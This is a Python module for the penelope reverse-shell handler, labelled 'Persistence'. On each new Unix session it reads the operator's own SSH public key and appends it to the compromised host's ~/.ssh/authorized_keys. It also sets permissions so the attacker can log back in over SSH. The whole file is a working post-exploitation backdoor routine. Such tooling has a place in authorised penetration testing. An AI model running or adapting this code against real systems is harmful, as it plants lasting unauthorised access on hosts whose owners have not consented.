import penelope
from pathlib import Path

class autossh(penelope.Module):

    category = "Persistence"
    os_filter = 'Unix'
    on_session_start = True
    on_first_attach = False
    on_session_end = False

    def run(session, args=None):
        """
        Append attacker's local public key to remote ~/.ssh/authorized_keys.

        Finds the best local public key (prefers ed25519 > rsa > ecdsa > dsa),
        creates ~/.ssh if missing (chmod 700), skips if key already present,
        otherwise appends and sets chmod 600 on authorized_keys.
        """
        if session.OS == 'Windows':
            #penelope.logger.error("Unix only")
            # Return silently instead.
            return

        # Find local public key
        ssh_dir = Path.home() / '.ssh'
        pub_keys = sorted(ssh_dir.glob('*.pub')) if ssh_dir.exists() else []

        if not pub_keys:
            penelope.logger.error(f"No public keys found in {ssh_dir}")
            return

        preferred = ['id_ed25519', 'id_rsa', 'id_ecdsa', 'id_dsa']
        pub_key_path = next(
            (ssh_dir / f'{name}.pub' for name in preferred if (ssh_dir / f'{name}.pub').exists()),
            pub_keys[0]
        )

        pub_key = pub_key_path.read_text().strip()
        penelope.logger.info(f"Using key: {pub_key_path.name}")

        # Ensure ~/.ssh exists
        session.exec('mkdir -p ~/.ssh && chmod 700 ~/.ssh')

        # Check if already present
        safe_key = pub_key.replace("'", "'\\''")
        check = session.exec(
            f"grep -qF '{safe_key}' ~/.ssh/authorized_keys 2>/dev/null && echo EXISTS",
            value=True
        )
        if check == 'EXISTS':
            penelope.logger.warning("Key already in authorized_keys, skipping")
            return

        # Append and lock down permissions
        session.exec(f"printf '%s\\n' '{safe_key}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys")
        penelope.logger.info(f"Key appended: {session.user} @ {session.ip}:~/.ssh/authorized_keys")
        penelope.logger.info("You should now be able to SSH into this host using the corresponding private key.")